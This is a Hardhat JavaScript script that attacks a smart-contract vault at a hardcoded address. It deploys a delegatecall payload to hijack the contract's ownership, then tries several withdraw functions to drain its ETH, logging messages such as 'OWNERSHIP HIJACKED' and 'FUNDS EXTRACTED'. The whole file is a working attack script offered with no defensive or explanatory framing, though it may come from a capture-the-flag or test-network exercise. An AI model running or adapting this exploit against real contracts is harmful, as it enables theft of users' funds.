const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

async function main() {
  console.log("\nüëë OWNERSHIP-BASED ATTACK");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  console.log("Attacker:", attacker.address);
  
  // Get gas settings
  const feeData = await ethers.provider.getFeeData();
  const gasSettings = {
    maxFeePerGas: feeData.maxFeePerGas * 2n,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas * 2n,
    gasLimit: 3000000
  };
  
  // Check current owner
  console.log("\nüîç Checking current owner...");
  try {
    const ownerCall = await attacker.call({
      to: VAULT_ADDRESS,
      data: "0x8da5cb5b" // owner()
    });
    const owner = "0x" + ownerCall.slice(26);
    console.log("Current owner:", owner);
    
    if (owner.toLowerCase() === attacker.address.toLowerCase()) {
      console.log("‚úÖ We already own the contract!");
    }
  } catch (e) {
    console.log("‚ùå Could not read owner");
  }
  
  // Get initial balance
  const vaultBalanceBefore = await ethers.provider.getBalance(VAULT_ADDRESS);
  console.log("\nVault balance:", ethers.formatEther(vaultBalanceBefore), "ETH");
  
  // Try to take ownership via delegatecall
  console.log("\nüéØ Attempting to hijack ownership via delegatecall...");
  
  // Deploy payload that changes owner
  const DelegatecallPayload = await ethers.getContractFactory("DelegatecallPayload");
  const payload = await DelegatecallPayload.deploy(gasSettings);
  await payload.waitForDeployment();
  const payloadAddress = await payload.getAddress();
  
  // Encode changeOwner call
  const changeOwnerData = payload.interface.encodeFunctionData("changeOwner", [attacker.address]);
  
  // Try delegatecall
  try {
    const delegateData = "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
      ["address", "bytes"],
      [payloadAddress, changeOwnerData]
    ).slice(2);
    
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: delegateData,
      ...gasSettings
    });
    
    await tx.wait();
    console.log("‚úÖ Delegatecall executed!");
    
    // Check if we're now the owner
    const newOwnerCall = await attacker.call({
      to: VAULT_ADDRESS,
      data: "0x8da5cb5b"
    });
    const newOwner = "0x" + newOwnerCall.slice(26);
    console.log("New owner:", newOwner);
    
    if (newOwner.toLowerCase() === attacker.address.toLowerCase()) {
      console.log("üéâ OWNERSHIP HIJACKED SUCCESSFULLY!");
      
      // Now try withdraw as owner
      console.log("\nüí∞ Attempting withdrawal as new owner...");
      
      const withdrawFunctions = [
        { selector: "0x3ccfd60b", name: "withdraw()" },
        { selector: "0x2e1a7d4d", name: "withdraw(uint256)", 
          data: ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [vaultBalanceBefore]) },
        { selector: "0xdb006a75", name: "emergencyWithdraw(uint256)", 
          data: ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [vaultBalanceBefore]) }
      ];
      
      for (const func of withdrawFunctions) {
        try {
          const withdrawTx = await attacker.sendTransaction({
            to: VAULT_ADDRESS,
            data: func.data ? func.selector + func.data.slice(2) : func.selector,
            ...gasSettings
          });
          
          const receipt = await withdrawTx.wait();
          console.log(`‚úÖ ${func.name} executed!`);
          
          const balanceAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
          if (balanceAfter < vaultBalanceBefore) {
            console.log(`üéâ FUNDS EXTRACTED: ${ethers.formatEther(vaultBalanceBefore - balanceAfter)} ETH!`);
            break;
          }
        } catch (e) {
          console.log(`‚ùå ${func.name} failed:`, e.message.slice(0, 50));
        }
      }
    }
  } catch (error) {
    console.log("‚ùå Ownership hijack failed:", error.message.slice(0, 60));
  }
  
  // Final balance
  const vaultBalanceAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
  const extracted = vaultBalanceBefore - vaultBalanceAfter;
  
  console.log("\nüìä FINAL RESULTS:");
  console.log("Vault lost:", ethers.formatEther(extracted), "ETH");
  
  if (extracted > 0n) {
    console.log("\nüèÜ ATTACK SUCCESSFUL!");
  } else {
    console.log("\n‚ùå Attack failed - no funds extracted");
  }
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
